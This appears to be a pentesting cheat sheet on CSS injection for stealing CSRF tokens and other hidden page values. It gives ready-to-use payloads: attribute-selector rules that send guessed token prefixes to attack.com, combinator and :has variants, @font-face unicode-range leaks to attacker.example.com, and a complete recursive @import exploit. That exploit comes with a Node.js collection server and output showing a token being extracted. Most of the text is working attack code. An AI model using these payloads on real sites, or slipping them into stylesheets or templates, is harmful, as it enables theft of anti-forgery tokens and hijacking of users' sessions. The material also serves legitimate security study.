# CSS Injection

## # Basic Attack

```css
input[id=csrftoken][value^=a] {
    background: url(https://attack.com/?data=a);
}

input[id=csrftoken][value^=b] {
    background: url(https://attack.com/?data=b);
}

...

input[id=csrftoken][value^=9] {
    background: url(https://attack.com/?data=9);
}
```

### Attack vector

```css
body {
   background-color: {{ color }} 
}
```

### Payload

```css
/mypage?color=red;}} input[id=csrftoken][value^=a] {{ background: url(https://attack.com/?data=a); (False) 
/mypage?color=red;}} input[id=csrftoken][value^=b] {{ background: url(https://attack.com/?data=b); (False)
/mypage?color=red;}} input[id=csrftoken][value^=c] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=d] {{ background: url(https://attack.com/?data=d); (True)
...
/mypage?color=red;}} input[id=csrftoken][value^=7] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=8] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=9] {{ background: url(https://attack.com/?data=c); (False)

/mypage?color=red;}} input[id=csrftoken][value^=da] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=db] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=dc] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=dd] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=de] {{ background: url(https://attack.com/?data=c); (True)
...
/mypage?color=red;}} input[id=csrftoken][value^=d8] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=d9] {{ background: url(https://attack.com/?data=c); (False)

/mypage?color=red;}} input[id=csrftoken][value^=dea] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=deb] {{ background: url(https://attack.com/?data=c); (False)
/mypage?color=red;}} input[id=csrftoken][value^=dec] {{ background: url(https://attack.com/?data=c); (False)
...
```

## # CSS Combinators

If the csrftoken name input is of type hidden, the previous payload may not work. Because the background won't be loaded. However, you can bypass this impediment by loading the background of the other element using <mark style="color:red;">CSS combinators</mark>,<mark style="color:red;">`:has`</mark> selector, or <mark style="color:red;">`:empty`</mark> selector etc..

```css
input[name=csrf][value^=a] ~ * {
   background: url(https://attack.com/?data={});
}
```

{% embed url="https://developer.mozilla.org/en-US/docs/Web/CSS/Subsequent-sibling_combinator" %}

## # :has Selector

:has selector does not support in Firefox browser.

```css
body:has(input[name=csrf][value^=a]) {
   background: url(https://attack.com/?data={});
}
```

{% embed url="https://developer.mozilla.org/en-US/docs/Web/CSS/:has" %}

## # @font-face / unicode-range

We can only know characters included in #sensitive-information. The order of characters is not guaranteed. &#x20;

{% embed url="https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html" %}

```css
<style>
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?A); /* fetched */
 unicode-range:U+0041;
}
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?B); /* fetched too */
 unicode-range:U+0042;
}
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?C); /* not fetched */
 unicode-range:U+0043;
}

...

@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?Z); /* not fetched */
 unicode-range:U+005A;
}

#sensitive-information{
 font-family:poc;
}
</style>
<p id="sensitive-information">AB</p>
```

## # @import

This method works recursively by getting both prefix and postfix character. However, this exploit code only works that input tag having secret value is in front of `@import`

```css
@import url('http://attacker.com:5001/start?');
```

[https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)

### Victim site

```html
<!doctype html>
<body>
    <div><article><div><p><div><div><div><div><div>
<input type="text" value="d3adc0d3">
<style>
@import url('http://localhost:5001/start?'); /* Injection */
</style>
```

### Attacker Server

```javascript
const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const DEBUG = false;

var prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
        default:
            response.end();
    }
}

const genResponse = (response) => {
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}')).join('') +
        'div '.repeat(n) + 'input{background:var(--e'+n+')}' +
        [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + prefix + e +')}')).join('') +
        'div '.repeat(n) + 'input{border-image:var(--s'+n+')}' +
        'input[value='+ prefix + postfix + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + '&)};';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}
```

### Output

```sh
ubuntu@DESKTOP-PBJ0V3Q:~/server$ node server.js
[+] Server is listening on 5001
...pre-payoad:
...post-payoad:
...pre-payoad: d
...post-payoad: 3
...pre-payoad: d3
...post-payoad: d3
...pre-payoad: d3a
...post-payoad: 0d3
...pre-payoad: d3ad
...post-payoad: c0d3
...pre-payoad: d3adc
...post-payoad: dc0d3
[+] END: d3adc0d3
```

## References

{% embed url="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection" %}











